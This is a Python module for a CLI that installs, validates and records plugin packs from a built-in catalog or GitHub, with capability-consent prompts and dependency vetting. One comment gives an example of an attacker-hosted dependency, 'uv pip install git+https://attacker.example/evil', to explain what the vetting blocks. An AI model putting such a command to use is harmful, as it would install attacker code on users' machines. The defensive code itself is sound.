"""``cdui plugin <subcommand>`` — install, sync, list, uninstall CodefyUI plugin packs.

Two install sources, one command::

    cdui plugin install deep                            # built-in direction pack via catalog
    cdui plugin install foo/bar                         # GitHub short form, default branch
    cdui plugin install foo/bar@v1.2.3                  # GitHub, tagged release
    cdui plugin install https://github.com/foo/bar      # full URL
    cdui plugin sync                                    # every built-in pack you have not decided about

Built-in catalog packs (kind=builtin in plugins/registry.json) are
activated in place — discovery walks ``<REPO>/plugins/<id>/`` directly,
nothing is copied. Third-party packs are downloaded to
``<USER_DATA>/plugins/<id>/`` via the GitHub tarball codeload endpoint.

The lockfile at ``<USER_DATA>/plugins/installed.json`` tracks every
install: source kind, SHA pin (for URL packs), declared manifest, and
which ``security.allowed_modules`` the user accepted.
"""

from __future__ import annotations

import argparse
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError

if sys.version_info >= (3, 11):
    import tomllib
else:
    import tomli as tomllib  # 3.10 backport — same API.

from app.core.plugin_loader import (
    MANIFEST_FILENAME,
    clear_removed,
    load_lockfile,
    mark_removed,
    plugins_builtin_root,
    plugins_user_root,
    removed_ids,
    save_lockfile,
)
from app.core.plugins import catalog as core_catalog
from app.core.plugins import consent as core_consent
from app.core.plugins import deps as core_deps
from app.core.plugins import github as core_github
from app.core.plugins import sources as core_sources
from app.core.plugins.errors import (
    ConsentRequired,
    GitHubError,
    PluginInstallError,
    UnknownCatalogName,
    UnparseableSource,
)
# The rules live in ``app.core.plugins`` so that the server can read them too;
# what follows is this module keeping the names it has always exported. The
# ``X as X`` spelling on the ones this file never calls itself is the
# explicit-re-export convention -- it marks them as deliberate rather than
# left over, for the linter and for the next reader.
from app.core.plugins.gate import (
    LOADER_SUFFIXES as LOADER_SUFFIXES,
    SCANNABLE_SUFFIXES as SCANNABLE_SUFFIXES,
    PluginValidationError,
    loader_suffix as loader_suffix,
    validate_nodes_dir as validate_nodes_dir,
    validate_plugin_dir,
)
from app.core.plugins.manifest import (
    PLUGIN_ID_RE,
    SUPPORTED_SCHEMA as SUPPORTED_SCHEMA,
    manifest_capabilities,
    manifest_has_frontend as _manifest_has_frontend,
    read_manifest,
    validate_manifest,
)
from app.core.plugins.sources import _GITHUB_SHORT, _GITHUB_URL
from app.core.security_tiers import (
    CAPABILITIES,
    CAPABILITY_SUMMARY,
    normalize_capabilities,
    unknown_capabilities,
)

# ── colour + i18n (kept self-contained so scripts/dev.py owns no deps here) ──

_USE_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None
RESET = "\033[0m" if _USE_COLOR else ""
BOLD = "\033[1m" if _USE_COLOR else ""
DIM = "\033[2m" if _USE_COLOR else ""
RED = "\033[31m" if _USE_COLOR else ""
GREEN = "\033[32m" if _USE_COLOR else ""
YELLOW = "\033[33m" if _USE_COLOR else ""
CYAN = "\033[36m" if _USE_COLOR else ""


def _supports_unicode() -> bool:
    """Whether stdout can encode our status glyphs.

    On a legacy Windows console (cp950 / cp1252) or a pipe whose encoding is the
    locale codepage, glyphs like ``▶`` / ``✓`` aren't encodable and ``print``
    raises UnicodeEncodeError, taking the whole command down. When that's the
    case we fall back to ASCII markers instead.
    """
    enc = getattr(sys.stdout, "encoding", None)
    if not enc:
        return False
    try:
        "▶✓✗●→".encode(enc)
        return True
    except (UnicodeEncodeError, LookupError):
        return False


_UNICODE = _supports_unicode()
MARK_SECTION = "▶" if _UNICODE else ">"
MARK_OK = "✓" if _UNICODE else "+"
MARK_ERR = "✗" if _UNICODE else "x"
MARK_INSTALLED = "●" if _UNICODE else "*"
ARROW = "→" if _UNICODE else "->"


def _reconfigure_stdio() -> None:
    """Best-effort safety net so output never crashes on an unencodable char.

    Keeps the console's native encoding — so Traditional Chinese still renders on
    a cp950 console — but replaces anything it can't encode rather than raising.
    Called from ``main`` so importing this module (e.g. in tests) leaves the
    captured stdio untouched.
    """
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(errors="replace")  # type: ignore[union-attr]
        except (AttributeError, ValueError, OSError):
            pass


def _lang() -> str:
    forced = os.environ.get("CODEFYUI_LANG")
    if forced:
        return forced
    locale = (os.environ.get("LANG") or os.environ.get("LC_ALL") or "").lower()
    return "zh" if locale.startswith("zh") else "en"


def t(zh: str, en: str) -> str:
    return zh if _lang() == "zh" else en


def section(zh: str, en: str) -> None:
    print(f"\n{BOLD}{CYAN}{MARK_SECTION} {t(zh, en)}{RESET}")


def info(zh: str, en: str) -> None:
    print(f"  {DIM}{t(zh, en)}{RESET}")


def warn(zh: str, en: str) -> None:
    print(f"  {YELLOW}! {t(zh, en)}{RESET}")


def err(zh: str, en: str) -> None:
    print(f"  {RED}{MARK_ERR} {t(zh, en)}{RESET}", file=sys.stderr)


def ok(zh: str, en: str) -> None:
    print(f"  {GREEN}{MARK_OK} {t(zh, en)}{RESET}")


# ── declared capabilities (core#133) ───────────────────────────────────────
#
# ``app.core.security_tiers`` owns the English one-liners because the AST
# validator quotes them in its refusals; the zh-TW halves live here with every
# other CLI string, so the two i18n systems stay where they already are.

_CAPABILITY_ZH: dict[str, str] = {
    "network": (
        "連線網路——可與任何主機收發資料，並把下載到的內容寫入磁碟"
        "（requests、urllib、http、socket）"
    ),
    "filesystem": (
        "使用檔案函式庫——pathlib、tempfile、shutil、zip/tar/gzip、sqlite3、glob。"
        "請注意：單純的 open() 本來就不需要任何宣告"
    ),
    "process-env": (
        "使用整個 os 模組——讀取**並修改**此行程的環境變數（包含其中的 API 金鑰）、"
        "啟動其他程式，以及刪除或重新命名檔案"
    ),
}


def _capability_line(capability: str) -> str:
    """``network -> reach the network ...`` in the caller's language.

    The arrow is the module's shared ``ARROW`` glyph, so a legacy Windows
    console that cannot encode it gets ``->`` instead of a crash.
    """
    return f"{capability} {ARROW} " + t(
        _CAPABILITY_ZH.get(capability, capability),
        CAPABILITY_SUMMARY.get(capability, capability),
    )


# ── catalog ────────────────────────────────────────────────────────────────
#
# Thin wrappers rather than plain re-exports, and deliberately so: the CLI's
# tests redirect the catalog by patching ``plugins.load_catalog`` and the
# built-in root by patching ``plugins.plugins_builtin_root``. Reading those
# through this module's own attributes is what keeps the patch working -- a
# core function that called its own copy would answer from the real
# ``registry.json`` while a test believed it had replaced it.

def _catalog_path() -> Path:
    return core_catalog.catalog_path(plugins_builtin_root())


def load_catalog() -> dict[str, Any]:
    return core_catalog.load_catalog(plugins_builtin_root())


def builtin_catalog_packs() -> dict[str, dict[str, Any]]:
    """The ``kind = "builtin"`` half of the catalog — packs that ship in-repo."""
    return core_catalog.builtin_catalog_packs(load_catalog())


def catalog_entries() -> dict[str, core_catalog.CatalogEntry]:
    """Every well-formed catalog row, in the shape the installer dispatches on.

    The raw dict is what most of this module reads, because that is what its
    tests fake; this is the same document run through
    :func:`~app.core.plugins.catalog.validate_catalog`, which is what turns
    ``kind`` into a promise -- a ``github`` row that reached here really does
    carry an ``owner/repo`` and really does not carry a ``path``.
    """
    return core_catalog.validate_catalog(load_catalog())


def catalog_entry(plugin_id: str) -> core_catalog.CatalogEntry | None:
    """One catalog row by id, case-insensitively, or ``None``.

    ``None`` means either "no such id" or "that row is malformed" -- the
    callers here treat both the same way, because a row the validator dropped
    is a row this build cannot install either.
    """
    return catalog_entries().get(plugin_id.lower())


def available_builtin_packs() -> list[tuple[str, str]]:
    """Built-in packs shipped on disk that this install has made no decision about.

    See :func:`app.core.plugins.catalog.available_builtin_packs` — the rule,
    and why a pack the user uninstalled is not "available", live there. What
    is here is the reading: both documents come from this module's own
    loaders (so a test that fakes them is what gets read), and a failure to
    read either is swallowed, because every caller is on its way to printing
    a notice and a notice must never take the command down with it.
    """
    try:
        return core_catalog.available_builtin_packs(load_catalog(), load_lockfile())
    except Exception:  # never let discoverability break a caller
        return []


# ── source parsing ─────────────────────────────────────────────────────────

def _unknown_catalog_name(spec: str, known: list[str]) -> ValueError:
    """The error for a bare word this install's catalog does not have (#363).

    The generic "expected a catalog name, owner/repo, or a URL" is a dead end
    here, because the user *did* type a catalog name — what they cannot see is
    that their copy of ``plugins/registry.json`` has never heard of it. The
    usual reason is an install old enough to predate the pack: a stale ``cdui``
    reported exactly this for ``edu``, which only entered the catalog in 1.3.0,
    and the message gave its user nothing to act on. So name the packs this
    install really has, and point at the update that would add the missing one.
    """
    have = ", ".join(known) if known else t("（無）", "(none)")
    lines = [
        t(
            f"這份安裝的內建外掛目錄裡沒有 {spec!r}。",
            f"No plugin pack named {spec!r} in this install's catalog.",
        ),
        t(f"目前可裝的內建包：{have}", f"Built-in packs available here: {have}"),
    ]
    if not known:
        lines.append(
            t(
                f"目錄檔讀不到或是空的：{_catalog_path()}",
                f"The catalog file is missing or unreadable: {_catalog_path()}",
            )
        )
    lines.append(
        t(
            "若這個包應該存在，代表你的 CodefyUI 比它舊 — 先執行 `cdui update` "
            "再試一次；第三方外掛則要寫成 owner/repo[@ref] 或完整的 GitHub URL。",
            "If the pack should exist, this install predates it — run `cdui update` "
            "and try again. Third-party packs need owner/repo[@ref] or a full GitHub URL.",
        )
    )
    return ValueError("\n    ".join(lines))


def parse_source(spec: str) -> tuple[str, str, str, str]:
    """Return ``(kind, a, b, ref)``. ``kind`` ∈ {"catalog", "github"}.

    For catalog: ``a`` = plugin id; ``b`` and ``ref`` are empty.
    For github: ``a`` = owner, ``b`` = repo, ``ref`` = tag/branch/sha (may be empty).

    The parsing rule is :func:`app.core.plugins.sources.parse_source`; what is
    here is the CLI's half of it. The catalog is read through this module (see
    the wrappers above), and the structured refusal is turned back into the
    bilingual ``ValueError`` every caller of this function already catches.
    """
    catalog = load_catalog()
    try:
        parsed = core_sources.parse_source(spec, catalog=catalog)
    except UnknownCatalogName as e:
        raise _unknown_catalog_name(spec, list(e.known)) from None
    except UnparseableSource:
        # Name the example from the catalog rather than hard-coding it: this line
        # spent three releases telling people to try "C2" after that pack was gone.
        known = sorted(catalog.get("plugins", {}))
        example = known[0] if known else "foundations"
        raise ValueError(
            t(
                f"無法解析外掛來源：{spec!r}。請輸入內建包名稱"
                f"（例如 {example}）、owner/repo[@ref] 或 GitHub URL。",
                f"Could not parse plugin source: {spec!r}. "
                f"Expected a catalog name (e.g. {example}), owner/repo[@ref], or a GitHub URL.",
            )
        ) from None
    return (parsed.kind, parsed.name_or_owner, parsed.repo, parsed.ref)


# ── GitHub helpers ─────────────────────────────────────────────────────────
#
# Plain re-exports, not wrappers: the request rules (the token header, the two
# shapes of failure, the size cap) live in ``app.core.plugins.github`` so the
# server obeys them too. They keep their names here because these are the
# attributes the install tests replace to stay off the network -- patching
# ``plugins.resolve_sha`` has to be what ``_install_github`` calls.

USER_AGENT = core_github.USER_AGENT
MAX_TARBALL_BYTES = core_github.MAX_TARBALL_BYTES
_gh_get = core_github._gh_get
resolve_sha = core_github.resolve_sha
download_tarball = core_github.download_tarball


# ── runtime helpers ────────────────────────────────────────────────────────

def now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _read_session_token() -> str | None:
    """Read the running server's session token from the local file.

    Returns ``None`` when the file is missing — typically because the server
    isn't running yet. ``_backend_reload`` treats that case as "skip the
    hot reload" rather than failing the install, so the user can still
    ``cdui start`` afterwards and pick up the new plugin.
    """
    try:
        from platformdirs import user_data_dir
    except ImportError:
        return None
    override = os.environ.get("CODEFYUI_USER_DATA_DIR")
    base = Path(override) if override else Path(user_data_dir("codefyui", appauthor=False))
    p = base / "session.token"
    try:
        return p.read_text(encoding="ascii").strip()
    except (OSError, UnicodeDecodeError):
        return None


def _reload_target() -> tuple[str, str]:
    """``(url, host_header)`` for ``POST /api/plugins/reload``.

    Targets the port the server is actually configured to bind rather than a
    hardcoded ``:8000``, so ``link`` / ``dev`` / ``reload`` keep working when the
    user runs the server elsewhere (``CODEFYUI_PORT`` env or a ``.env`` file).
    Resolution order: the ``CODEFYUI_PORT`` env override (explicit + easy to test),
    then ``settings.PORT`` (which also honors ``.env``), then the ``8000`` default.

    The client always connects over the loopback address; ``auth.init_allowed_hosts``
    always whitelists ``127.0.0.1:<port>``, so a matching ``Host`` header passes the
    guard even when the server binds ``HOST=0.0.0.0``.
    """
    port = 8000
    env = os.environ.get("CODEFYUI_PORT", "").strip()
    if env.isdigit():
        port = int(env)
    else:
        try:
            from app.config import settings

            port = int(settings.PORT)
        except Exception:
            port = 8000
    netloc = f"127.0.0.1:{port}"
    return (f"http://{netloc}/api/plugins/reload", netloc)


def _backend_reload() -> bool:
    """POST /api/plugins/reload — best-effort hot reload.

    The server requires a session token on mutating endpoints (see
    auth_guard middleware). The token is rotated per-process and persisted
    to a 0600 file in the user data dir; we read it back here so plugin
    install / uninstall keeps working without manual configuration.
    """
    token = _read_session_token()
    if token is None:
        return False
    url, host = _reload_target()
    try:
        req = urllib.request.Request(
            url,
            method="POST",
            headers={
                "User-Agent": USER_AGENT,
                "Content-Length": "0",
                "X-CodefyUI-Token": token,
                "Host": host,  # Match the Host whitelist.
            },
            data=b"",
        )
        with urllib.request.urlopen(req, timeout=5.0):
            return True
    except (URLError, HTTPError, TimeoutError, OSError):
        return False


# The vetting that keeps a manifest's ``[python_deps]`` from becoming
# ``uv pip install git+https://attacker.example/evil``; the rule and its
# reasoning live in ``app.core.plugins.deps``. Re-exported under the names
# this module has always had.
_SAFE_DEP_NAME = core_deps._SAFE_DEP_NAME
_SAFE_DEP_VERSION = core_deps._SAFE_DEP_VERSION
_UnsafeDepSpec = core_deps._UnsafeDepSpec
_build_dep_spec = core_deps._build_dep_spec


def _install_deps(deps: dict[str, str]) -> int:
    """Install ``python_deps`` via ``uv pip`` into the codefyui venv.

    Targets the current interpreter explicitly with ``--python sys.executable``.
    ``cdui``/``dev.py`` re-exec into ``backend/.venv`` before running plugin
    commands, so ``sys.executable`` is the codefyui venv — but a bare
    ``uv pip install`` would look for a ``.venv`` relative to the *cwd* (the
    repo root, where the user invoked ``.\\cdui``), not ``backend/.venv``, and
    fail with "No virtual environment found". Pinning ``--python`` removes the
    cwd dependency.
    """
    try:
        specs = core_deps.dep_specs(deps)
    except PluginInstallError as e:
        err(str(e), str(e))
        return 1
    cmd = ["uv", "pip", "install", "--python", sys.executable, *specs]
    info(
        f"執行：{' '.join(cmd)}",
        f"Running: {' '.join(cmd)}",
    )
    try:
        r = subprocess.run(cmd, check=False)
    except FileNotFoundError:
        err("找不到 uv 指令", "Could not find `uv` on PATH")
        return 1
    return r.returncode


# ── the capability prompt (core#133, tier 1) ───────────────────────────────

#: Sentinel for "the user said no". Distinct from the empty tuple, which is
#: the ordinary "this plugin asked for nothing" answer.
CAPABILITIES_REFUSED = None


def _stdin_is_interactive() -> bool:
    """Whether there is a human on the other end of ``input()``.

    A pytest run, a CI job and ``| tee`` all answer False, and all of them
    must take the non-interactive branch rather than blocking forever on a
    prompt nobody will ever see. On Windows this is only reachable at all
    because ``dev.py`` re-executes the venv interpreter with
    :func:`_reexec` -- ``subprocess.run`` keeps the console attached, where
    ``os.execv`` would have orphaned it and made every prompt read EOF.
    """
    try:
        return bool(sys.stdin) and sys.stdin.isatty()
    except (AttributeError, ValueError, OSError):
        return False


def capability_gate(
    manifest: dict[str, Any],
    args: argparse.Namespace,
) -> tuple[str, ...] | None:
    """Decide which capabilities this install may grant, asking if it must.

    Returns the granted tuple, or ``CAPABILITIES_REFUSED`` (``None``) when the
    install must stop. Four outcomes, in the order they are tried:

    1. the manifest declares nothing -> ``()``, silently;
    2. everything it asks for was already granted (the ``update`` path, where
       *prior_capabilities* carries the lockfile's record) -> granted, with a
       note, and no second prompt for a decision the user already made;
    3. ``--accept-capabilities`` -> granted, after printing what was accepted,
       because a flag that grants something silently is a flag people
       copy-paste;
    4. otherwise print the request and ask. With no human attached the answer
       is no, and the message names the flag -- refusing beats defaulting to
       yes, and beats hanging on an ``input()`` in a CI job.

    The declared set is checked against this build's vocabulary first;
    ``validate_manifest`` already refuses an unknown name, so reaching one
    here means a caller skipped it, and refusing is the safe reading.

    Which capabilities are covered, and which are new since the version the
    user consented to, is :func:`app.core.plugins.consent.decide_capabilities`
    -- the same arithmetic a dialog will do. What is here is the
    conversation: the printing, the prompt, and the refusal.
    """
    requested = manifest_capabilities(manifest)
    if not requested:
        return ()

    unknown = unknown_capabilities(requested)
    if unknown:
        err(
            f"manifest 要求未知的能力：{', '.join(unknown)}。"
            f"此版本支援：{', '.join(CAPABILITIES)}。",
            f"Manifest requests unknown capabilities: {', '.join(unknown)}. "
            f"This build knows: {', '.join(CAPABILITIES)}.",
        )
        return CAPABILITIES_REFUSED

    # ``None`` rather than an empty tuple when there is no record: "installed
    # before and granted nothing" and "never installed" differ, and only the
    # first makes an unchanged request into growth worth warning about.
    prior = normalize_capabilities(getattr(args, "prior_capabilities", None))
    decision = core_consent.decide_capabilities(requested, prior=prior or None)
    if not decision.missing:
        info(
            f"沿用先前授權的能力：{', '.join(decision.granted)}",
            f"Re-using previously granted capabilities: {', '.join(decision.granted)}",
        )
        return requested

    section("此外掛要求下列能力", "This plugin requests the following capabilities")
    for capability in requested:
        print(f"    {BOLD}{_capability_line(capability)}{RESET}")
    info(
        "能力是宣告，不是沙箱：授權後外掛就能使用該類模組，CodefyUI 不會再逐一攔截。",
        "A capability is a declaration, not a sandbox: once granted, the "
        "plugin may use that group of modules and CodefyUI stops asking.",
    )
    if decision.grew:
        grew = ", ".join(sorted(decision.grew))
        warn(f"這次比上次多要了：{grew}", f"This is more than last time: {grew}")

    if getattr(args, "accept_capabilities", False):
        ok(
            f"已由 --accept-capabilities 接受：{', '.join(requested)}",
            f"Accepted via --accept-capabilities: {', '.join(requested)}",
        )
        return requested

    def _no_terminal() -> None:
        err(
            "非互動模式無法確認能力要求。確定要授權請加 --accept-capabilities。",
            "Cannot confirm a capability request without a terminal. "
            "Pass --accept-capabilities if you mean to grant these.",
        )

    if not _stdin_is_interactive():
        _no_terminal()
        return CAPABILITIES_REFUSED

    try:
        answer = input(f"  {t('要授權嗎？', 'Grant these?')} [y/N]: ").strip().lower()
    except EOFError:
        # ``isatty()`` said yes and stdin was closed anyway -- an install
        # driven from a here-doc or a pipe on a terminal. Fail closed like the
        # branch above, and print the same way out, because "Cancelled" on its
        # own leaves the user with no idea what to do differently.
        print()
        _no_terminal()
        return CAPABILITIES_REFUSED
    if answer not in ("y", "yes"):
        warn("已取消（未授權任何能力）", "Cancelled (nothing was granted)")
        return CAPABILITIES_REFUSED
    return requested


# ── commands ───────────────────────────────────────────────────────────────

def cmd_install(args: argparse.Namespace) -> int:
    sources: list[str] = args.source if isinstance(args.source, list) else [args.source]
    if not sources:
        err("沒有指定來源", "No source specified")
        return 2

    # Reload the lockfile per source so the next pre-existing check sees prior installs.
    overall = 0
    for spec in sources:
        section(f"安裝外掛：{spec}", f"Installing plugin: {spec}")
        try:
            kind, a, b, ref = parse_source(spec)
        except ValueError as e:
            err(str(e), str(e))
            return 2

        lockfile = load_lockfile()
        rc = (
            _install_by_catalog_name(a, args, lockfile)
            if kind == "catalog"
            else _install_github(a, b, ref, args, lockfile)
        )
        if rc != 0:
            return rc
        overall = rc
    return overall


def _install_by_catalog_name(plugin_id: str, args, lockfile) -> int:
    """Install the pack the catalog calls *plugin_id*, whichever kind it is.

    ``parse_source`` answers "catalog" for any id in ``registry.json``, and
    the two kinds behind that word are installed by completely different
    code: a ``builtin`` pack is activated in place from the release's own
    files, a ``github`` pack is fetched from the repository the catalog
    names. Deciding here rather than in ``cmd_install`` keeps the two
    branches side by side, where the difference is the whole point.

    The catalog id is carried into the repository install so the lockfile can
    record which row the pack came from -- that is what lets a Plugin Center
    show it as the catalog's pack rather than as free text that happens to
    have the same id.
    """
    entry = catalog_entry(plugin_id)
    if entry is not None and entry.kind == "github":
        owner, _, repo = (entry.repo or "").partition("/")
        return _install_github(
            owner, repo, entry.ref, args, lockfile, catalog_id=entry.id
        )
    # Either a builtin row or one ``validate_catalog`` dropped. The second is
    # deliberately not a separate refusal: the builtin path already stops on a
    # pack with no manifest on disk, which is exactly what a malformed row
    # leaves behind, and a corrupt catalog must not grow its own vocabulary of
    # errors that only a hand-edited registry.json can reach.
    return _install_catalog(plugin_id, args, lockfile)


def _install_catalog(plugin_id: str, args, lockfile) -> int:
    catalog = load_catalog()
    entry = catalog["plugins"][plugin_id]
    plugin_dir = plugins_builtin_root() / plugin_id

    if not (plugin_dir / MANIFEST_FILENAME).exists():
        err(
            f"目錄 {plugin_dir} 缺少 cdui.plugin.toml",
            f"Built-in pack '{plugin_id}' has no manifest at {plugin_dir}",
        )
        return 1

    try:
        manifest = read_manifest(plugin_dir)
        validate_manifest(manifest)
    except (ValueError, FileNotFoundError) as e:
        err(str(e), str(e))
        return 1

    if plugin_id in lockfile.get("plugins", {}) and not args.force:
        err(
            f"外掛 {plugin_id} 已安裝。加 --force 重新啟用。",
            f"Plugin '{plugin_id}' is already installed. Use --force to reactivate.",
        )
        return 1

    info(f"來源：{entry.get('name', plugin_id)}", f"Source: {entry.get('name', plugin_id)}")

    # Catalog packs ship inside the CodefyUI repo and are reviewed via PR —
    # the AST gate exists for the in-app .py-upload path (where untrusted
    # users supply the code) and the third-party URL path, not for code
    # we already trust. Skipping here avoids false-positives on legitimate
    # patterns like `getattr(context, "verbose", False)`.
    allowed = manifest.get("security", {}).get("allowed_modules") or []

    # Same reasoning for the capability prompt: a pack that ships inside this
    # repo is not a third party asking for permission, and prompting while
    # skipping the gate entirely would be theatre. What it does get is a
    # RECORD -- printed here, written to the lockfile below -- so that
    # `cdui plugin list` answers "which of my plugins reaches the network"
    # for every pack, wherever it came from.
    capabilities = manifest_capabilities(manifest)
    for capability in capabilities:
        line = _capability_line(capability)
        info(f"能力：{line}", f"Capability: {line}")

    deps = manifest.get("python_deps", {})
    if deps:
        info(
            f"安裝 python_deps：{', '.join(deps)}",
            f"Installing python_deps: {', '.join(deps)}",
        )
        rc = _install_deps(deps)
        if rc != 0:
            return rc

    # Installing a pack by name is how you undo having uninstalled it, so the
    # tombstone goes with it (#175). Said out loud rather than silently, because
    # the state it clears is invisible: nothing else would tell the user that
    # `cdui plugin sync` has started counting this pack again.
    if clear_removed(lockfile, plugin_id):
        info(
            f"已清除先前的移除記錄（cdui plugin sync 之後會把 {plugin_id} 一併納入）",
            f"Cleared the earlier uninstall record — `cdui plugin sync` counts "
            f"{plugin_id} again from now on",
        )

    lockfile.setdefault("plugins", {})[plugin_id] = {
        "source_kind": "builtin",
        "source": plugin_id,
        "installed_at": now_iso(),
        "manifest": manifest.get("plugin", {}),
        "trusted_modules": list(allowed),
        "capabilities": list(capabilities),
        "enabled": True,
    }
    save_lockfile(lockfile)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
    else:
        info(
            "伺服器未運行，下次 cdui start 會自動載入",
            "Server not running; next `cdui start` will pick this up.",
        )
    ok(f"安裝完成：{plugin_id}", f"Installed: {plugin_id}")
    return 0


def _reserved_id_refusal(
    plugin_id: str, owner: str, repo: str
) -> tuple[str, str] | None:
    """The bilingual refusal for an id ``{owner}/{repo}`` may not install
    under, or ``None`` when it may.

    Three ids are refused, and the third is the one worth spelling out. An id
    is taken if it names a route under ``/api/plugins/`` (the router, not the
    plugin, would decide which one answers) or a pack that ships with
    CodefyUI (the built-in directory would decide). A ``github`` catalog id
    is different: that row IS a repository, so refusing it outright would
    make the official pack the catalog advertises the one thing nobody can
    install. So it is refused only for a DIFFERENT repository -- the id is
    what the lockfile, the catalog card and the route all key on, and a fork
    claiming it would quietly take the official pack's place.
    """
    entry = catalog_entry(plugin_id)
    if plugin_id in core_catalog.RESERVED_PLUGIN_IDS:
        return (
            f"外掛 id {plugin_id} 是保留名稱（/api/plugins/ 底下的路由），不能安裝。",
            f"Plugin id '{plugin_id}' is reserved by this build "
            f"(a route under /api/plugins/).",
        )
    if entry is not None and entry.kind == "builtin":
        return (
            f"外掛 id {plugin_id} 是保留名稱（CodefyUI 內建的外掛包），不能安裝。",
            f"Plugin id '{plugin_id}' is reserved by this build "
            f"(a pack that ships with CodefyUI).",
        )
    if (
        entry is not None
        and entry.kind == "github"
        and f"{owner}/{repo}".lower() != (entry.repo or "").lower()
    ):
        return (
            f"外掛 id {plugin_id} 在目錄中屬於 {entry.repo}；"
            f"只有該儲存庫可以用這個 id 安裝，{owner}/{repo} 不行。",
            f"Plugin id '{plugin_id}' belongs to {entry.repo} in this "
            f"install's catalog; only that repository may install under it, "
            f"not {owner}/{repo}.",
        )
    return None


def _install_github(
    owner: str,
    repo: str,
    ref: str,
    args,
    lockfile,
    *,
    catalog_id: str | None = None,
) -> int:
    """Install the pack in ``{owner}/{repo}`` at *ref*.

    *catalog_id* is the catalog row this install came from, when it came from
    one; it is recorded in the lockfile so a later reader can tell the
    catalog's own pack from free text that happens to carry the same id.
    Keyword-only and last so the five positional arguments stay what they
    were -- ``scripts/project.py`` restores a project's pins through this
    function positionally.
    """
    url = f"https://github.com/{owner}/{repo}"
    info(f"來源：{url}", f"Source: {url}")
    pinned_sha = getattr(args, "pinned_sha", None)
    if pinned_sha:
        # Restore path (spec ID11): install BY the pinned sha -- never re-resolve
        # a possibly-moved tag. Using the pinned value verifies resolved==pinned.
        sha = pinned_sha
    else:
        try:
            sha = resolve_sha(owner, repo, ref)
        except RuntimeError as e:
            err(str(e), str(e))
            return 1

    short_sha = sha[:7]
    info(
        f"版本：{ref or 'default branch'} ({short_sha})",
        f"Ref: {ref or 'default branch'} ({short_sha})",
    )

    if not args.no_confirm:
        try:
            ans = input(f"  {t('繼續？', 'Proceed?')} [y/N]: ").strip().lower()
        except EOFError:
            ans = ""
        if ans not in ("y", "yes"):
            warn("已取消", "Cancelled")
            return 0

    with tempfile.TemporaryDirectory() as tmpd:
        tar = Path(tmpd) / "src.tar.gz"
        try:
            download_tarball(owner, repo, sha, tar)
        # What the core client actually raises: GitHubError for anything the
        # network answered (or did not), PluginInstallError for the size cap,
        # OSError for the disk it is being written to. Named rather than
        # caught through their base classes -- the first two are RuntimeError
        # subclasses only by an inheritance choice made three modules away,
        # and a failed install that becomes a traceback is not a small bug.
        except (GitHubError, PluginInstallError, OSError) as e:
            err(f"下載失敗：{e}", f"Download failed: {e}")
            return 1

        extracted = Path(tmpd) / "extracted"
        extracted.mkdir()
        try:
            root = core_github.extract_tarball(tar, extracted)
        except (tarfile.TarError, PluginInstallError) as e:
            err(f"解壓失敗：{e}", f"Extraction failed: {e}")
            return 1

        try:
            manifest = read_manifest(root)
            validate_manifest(manifest)
        except (ValueError, FileNotFoundError) as e:
            err(str(e), str(e))
            return 1

        if _manifest_has_frontend(manifest):
            warn(
                "此外掛包含前端 UI 程式碼（JavaScript），安裝後將在您的瀏覽器中"
                "以完整編輯器存取權限執行。請僅安裝您信任的外掛。",
                "This plugin ships frontend UI code (JavaScript). After install it"
                " runs in your browser inside CodefyUI with full editor access."
                " Only install plugins you trust.",
            )

        plugin_id = manifest["plugin"]["id"]
        allowed = manifest.get("security", {}).get("allowed_modules") or []
        try:
            core_consent.check_trust(allowed, trust_author=args.trust_author)
        except ConsentRequired as e:
            asked = ", ".join(e.allowed_modules)
            err(
                f"外掛要求白名單以外的模組：{asked}。加 --trust-author 同意。",
                f"Plugin requests non-default modules: {asked}. "
                f"Pass --trust-author to accept.",
            )
            return 1

        # Tier 1. Asked BEFORE anything is copied out of the temp directory,
        # so a "no" leaves nothing behind but the tarball the context manager
        # is about to delete.
        capabilities = capability_gate(manifest, args)
        if capabilities is CAPABILITIES_REFUSED:
            return 1

        try:
            # Validate the *entire* extracted tarball, not just nodes/. The
            # plugin loader exposes the plugin root as a namespace package so
            # ``from .. import helper`` from a node would otherwise import
            # unscanned helpers.
            validate_plugin_dir(root, allowed, capabilities)
        except PluginValidationError as e:
            err(str(e), str(e))
            return 1

        # Reserved ids: a route, a pack that ships here, or another
        # repository's catalog row. See _reserved_id_refusal for why the third
        # is about which repo rather than about the id alone.
        refusal = _reserved_id_refusal(plugin_id, owner, repo)
        if refusal is not None:
            err(*refusal)
            return 1

        final = plugins_user_root() / plugin_id
        if final.exists() and not args.force:
            err(
                f"外掛 {plugin_id} 已安裝。加 --force 重新安裝。",
                f"Plugin '{plugin_id}' already installed. Use --force to overwrite.",
            )
            return 1

        staging = plugins_user_root() / ".staging" / f"{plugin_id}-{short_sha}"
        staging.parent.mkdir(parents=True, exist_ok=True)
        if staging.exists():
            shutil.rmtree(staging)
        shutil.copytree(root, staging)

        backup: Path | None = None
        if final.exists():
            backup = final.with_name(f"{plugin_id}.old-{int(time.time())}")
            final.rename(backup)
        try:
            staging.rename(final)
        except OSError as e:
            if backup is not None:
                backup.rename(final)
            err(f"安裝失敗：{e}", f"Install failed: {e}")
            return 1

        deps = manifest.get("python_deps", {})
        if deps:
            info(
                f"安裝 python_deps：{', '.join(deps)}",
                f"Installing python_deps: {', '.join(deps)}",
            )
            rc = _install_deps(deps)
            if rc != 0:
                shutil.rmtree(final, ignore_errors=True)
                if backup is not None:
                    backup.rename(final)
                return rc

        record: dict[str, Any] = {
            "source_kind": "github_url",
            "source": f"{owner}/{repo}" + (f"@{ref}" if ref else ""),
            "url": url,
            "ref": ref,
            "sha": sha,
            "installed_at": now_iso(),
            "manifest": manifest.get("plugin", {}),
            "trusted_modules": list(allowed),
            "capabilities": list(capabilities),
            "enabled": True,
        }
        if catalog_id is not None:
            # Only when there really was a catalog row. Writing the key
            # unconditionally would have every free-text install claim a
            # catalog identity it does not have, and "installed from the
            # catalog" is exactly the claim a reader wants to trust.
            record["catalog_id"] = catalog_id
        lockfile.setdefault("plugins", {})[plugin_id] = record
        save_lockfile(lockfile)

        if backup is not None:
            shutil.rmtree(backup, ignore_errors=True)

    if _backend_reload():
        ok("熱重載完成", "Hot-reloaded backend")
